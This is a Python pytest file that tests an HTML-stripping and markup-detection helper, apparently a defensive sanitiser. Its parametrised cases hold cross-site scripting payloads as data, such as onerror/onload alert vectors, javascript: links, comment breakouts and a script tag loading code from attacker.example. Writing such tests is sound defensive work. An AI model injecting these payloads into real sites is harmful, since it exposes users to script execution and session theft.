import pytest

from services.text_safety import contains_html_markup, strip_html_markup


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        ("<img/src=x onerror=alert(1)>", ""),
        ("<svg/onload=alert(1)>", ""),
        ("<script src=//attacker.example/xss.js", ""),
        ('<a href="javascript:alert(1)">click me</a>', "click me"),
        ("<!--><script>alert(1)</script>-->", ""),
        ("<script@x.y>alert(1)</script@x.y>", "alert(1)"),
        ("<xmp>raw legacy text</xmp>", "raw legacy text"),
        ("&lt;XMP&gt;raw legacy text&lt;/XMP&gt;", "raw legacy text"),
        ("<listing>raw legacy text</listing>", "raw legacy text"),
        ("<plaintext>raw legacy text", "raw legacy text"),
    ],
)
def test_strip_html_markup_never_returns_raw_tag_like_payloads(payload, expected):
    assert strip_html_markup(payload) == expected


def test_strip_html_markup_preserves_legitimate_comment_terminator_text():
    assert strip_html_markup("Keep --&gt; as text") == "Keep --> as text"


@pytest.mark.parametrize(
    "safe_text",
    [
        "Alice <alice@example.com>",
        'AT&T: 2 < 3 and Tom "T"',
        "Compare a < b before saving",
        "Track <BudgetReview> next",
    ],
)
def test_strip_html_markup_preserves_safe_angle_bracket_display_text(safe_text):
    assert strip_html_markup(safe_text) == safe_text


def test_strip_html_markup_plain_text_fast_path_skips_parser(monkeypatch):
    class ParserThatShouldNotRun:
        def __init__(self):
            raise AssertionError("plain-text fast path should not instantiate parser")

    monkeypatch.setattr(
        "services.text_safety._PlainTextHTMLParser", ParserThatShouldNotRun
    )

    assert (
        strip_html_markup("plain   text\n\n second\tline ")
        == "plain text\nsecond line"
    )


def test_contains_html_markup_allows_plain_alphabetic_comparison_text():
    assert contains_html_markup("Compare a < b before saving") is False


def test_contains_html_markup_allows_plain_bracketed_labels():
    assert contains_html_markup("Track <BudgetReview> next") is False


@pytest.mark.parametrize(
    "payload",
    [
        "&lt;img src=x onerror=alert(document.domain)&gt;",
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<math/href=javascript:alert(1)@x>",
        "<script src=//attacker.example/xss.js",
        "&lt;script src=//attacker.example/xss.js",
        "<xmp>raw legacy text</xmp>",
        "&lt;XMP&gt;raw legacy text&lt;/XMP&gt;",
        "<listing>raw legacy text</listing>",
        "<plaintext>raw legacy text",
    ],
)
def test_contains_html_markup_flags_browser_tolerated_active_markup(payload):
    assert contains_html_markup(payload) is True
